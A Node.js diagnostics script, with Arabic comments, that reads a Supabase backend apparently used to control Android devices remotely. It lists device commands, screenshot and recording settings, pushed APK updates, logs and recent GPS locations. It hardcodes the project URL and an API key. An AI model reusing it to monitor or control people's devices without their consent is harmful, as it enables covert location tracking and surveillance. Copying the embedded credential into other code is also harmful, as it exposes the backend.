/**
 * فحص حالة قاعدة بيانات Supabase — Direct Update Bridge
 * تشغيل: node check_db_state.js
 */
const { createClient } = require('@supabase/supabase-js');

const dbUrl = 'https://kubowqqqawkgghxcktoe.supabase.co';
const dbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM';
const supabase = createClient(dbUrl, dbKey);

const SEP = '─'.repeat(55);

async function check() {
    console.log('\n' + SEP);
    console.log('  Supabase State Check — Update Bridge Diagnostics');
    console.log(SEP + '\n');
    
    // ─── 0. التحقق من الأعمدة (Schema Check) ─────────────────────────
    console.log('🔍 SCHEMA CHECK (commands table)');
    try {
        const { data: cols, error: cErr } = await supabase
            .from('commands')
            .select('payload')
            .limit(1);
        
        if (cErr) {
            if (cErr.message.includes('column "payload" does not exist')) {
                console.log('   ❌ ERROR: Column "payload" is MISSING! (Causes 400 errors)');
            } else {
                console.error('   ERROR:', cErr.message);
            }
        } else {
            console.log('   ✅ SUCCESS: Column "payload" exists.');
        }
    } catch (e) {
        console.error('   CRITICAL:', e.message);
    }
    console.log('\n' + SEP);


    // ─── 1. الأجهزة المسجلة ─────────────────────────────────────────
    console.log('📱  DEVICES (remote_settings)');
    const { data: settings, error: sErr } = await supabase
        .from('remote_settings')
        .select('device_id, nickname, target_version, update_apk_path, update_apk_url, screenshot_interval_ms, updated_at, recording_enabled, capture_interval');
    if (sErr) console.error('   ERROR:', sErr.message);
    else if (!settings?.length) console.log('   (no devices registered yet)');
    else settings.forEach(s => {
        const lastSeen = s.updated_at ? new Date(s.updated_at) : null;
        const age = lastSeen ? Math.round((Date.now() - lastSeen) / 60000) : '?';
        const online = age !== '?' && age < 5 ? '🟢 ONLINE' : '🔴 OFFLINE';
        console.log(`\n   Device  : ${s.device_id}`);
        console.log(`   Name    : ${s.nickname || '—'}`);
        console.log(`   Status  : ${online} (last seen ${age}m ago)`);
        console.log(`   Version : current target = v${s.target_version ?? 1}`);
        console.log(`   APK Path: ${s.update_apk_path ?? '—'}`);
        console.log(`   APK URL : ${s.update_apk_url ?? '—'}`);
        console.log(`   Interval: ${s.screenshot_interval_ms ?? 60000}ms`);
        console.log(`   Auto Rec: enabled=${s.recording_enabled ?? false}, interval=${s.capture_interval ?? '—'}ms`);
    });

    // ─── 2. أوامر معلقة ─────────────────────────────────────────────
    console.log('\n' + SEP);
    console.log('⚡  PENDING COMMANDS');
    const { data: pending, error: pErr } = await supabase
        .from('commands')
        .select('*')
        .eq('status', 'PENDING')
        .order('created_at', { ascending: false })
        .limit(10);
    if (pErr) console.error('   ERROR:', pErr.message);
    else if (!pending?.length) console.log('   (no pending commands)');
    else pending.forEach(c => console.log(`   [${c.command}] → ${c.device_id} (${c.created_at})`));

    // ─── 3. آخر الأوامر المنفذة ─────────────────────────────────────
    console.log('\n' + SEP);
    console.log('✅  RECENTLY EXECUTED COMMANDS (last 5)');
    const { data: executed } = await supabase
        .from('commands')
        .select('device_id, command, status, executed_at')
        .neq('status', 'PENDING')
        .order('executed_at', { ascending: false })
        .limit(5);
    if (!executed?.length) console.log('   (none)');
    else executed.forEach(c => console.log(`   [${c.status}] ${c.command} → ${c.device_id} @ ${c.executed_at ?? '?'}`));

    // ─── 4. آخر سجلات التشخيص ───────────────────────────────────────
    console.log('\n' + SEP);
    console.log('📋  REMOTE LOGS (last 10)');
    const { data: logs, error: lErr } = await supabase
        .from('remote_logs')
        .select('device_id, level, tag, message, created_at')
        .order('created_at', { ascending: false })
        .limit(10);
    if (lErr) console.error('   ERROR:', lErr.message);
    else if (!logs?.length) console.log('   (no logs yet)');
    else logs.forEach(l => {
        const icon = l.level === 'ERROR' ? '🔴' : l.level === 'WARN' ? '🟡' : '🟢';
        console.log(`   ${icon} [${l.tag}] ${l.message}  (${l.device_id?.slice(0,8)}…)`);
    });

    // ─── 5. ملفات APK في bucket التحديثات ──────────────────────────
    console.log('\n' + SEP);
    console.log('📦  UPDATE APKs (storage: updates/apk/)');
    const { data: apkFiles, error: aErr } = await supabase.storage
        .from('updates')
        .list('apk', { sortBy: { column: 'created_at', order: 'desc' } });
    if (aErr) console.error('   ERROR:', aErr.message, '(bucket "updates" may not exist yet — run update_schema.sql)');
    else if (!apkFiles?.length) console.log('   (no APKs uploaded yet)');
    else apkFiles.forEach(f => {
        const mb = f.metadata?.size ? (f.metadata.size / 1048576).toFixed(1) : '?';
        console.log(`   📱 ${f.name}  (${mb} MB)  — ${f.created_at}`);
    });

    // ─── 6. آخر مواقع GPS ────────────────────────────────────────────
    console.log('\n' + SEP);
    console.log('📍  LOCATIONS (last 3)');
    const { data: locs } = await supabase
        .from('locations')
        .select('device_id, latitude, longitude, accuracy, battery_level, timestamp')
        .order('timestamp', { ascending: false })
        .limit(3);
    if (!locs?.length) console.log('   (no location data)');
    else locs.forEach(l => console.log(
        `   ${l.device_id?.slice(0,8)}… → (${l.latitude?.toFixed(4)}, ${l.longitude?.toFixed(4)}) acc:${l.accuracy}m 🔋${l.battery_level}%`
    ));

    console.log('\n' + SEP + '\n');
}

check().catch(console.error);
